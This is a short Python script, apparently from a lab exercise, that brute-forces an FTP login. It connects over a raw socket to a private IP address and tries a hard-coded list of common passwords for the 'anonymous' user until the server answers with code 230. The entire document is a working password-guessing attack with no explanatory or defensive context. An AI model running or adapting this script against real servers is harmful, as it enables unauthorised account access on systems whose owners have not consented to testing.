import socket
import re
import sys

# Target FTP server and port
target_ip = "192.168.71.128" # Your updated IP address
port = 21

# List of password to test
passwords = ["12345", "password", "qwerty", "letmein", "admin", "root"]

# Create a socket and connect to the target
try:
   ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   ftp_socket.connect((target_ip, port))
   print(f"Connected to FTP server at {target_ip}:{port}")
except Exception as e:
   print(f"Failed to connect to FTP server: {e}")
   sys.exit(1)

# Read the FTP server's
response =ftp_socket.recv(1024).decode()
print(f"Server response: {response}")

# Loop through the password list
for password in passwords:
   try:
     # Send a login attempt 
     login_command = f"USER anonymous\r\n"
     ftp_socket.send(login_command.encode())
     ftp_socket.recv(1024) 
     # Skip the response for the USER command
     pass_command = f"PASS {password}\r\n"
     ftp_socket.send(pass_command.encode())
     response = ftp_socket.recv(1024).decode()

     print(f"Trying password: {password}")
     print(f"Response: {response}")

     # Check if the response contains the success code "230"
     if re.search(r"230", response):
          print(f"Password found: {password}")
          break
   except Exception as e:
     print(f"Error during login attempt: {e}")
     break

# Close the socket
ftp_socket.close()
print("Connection closed.")
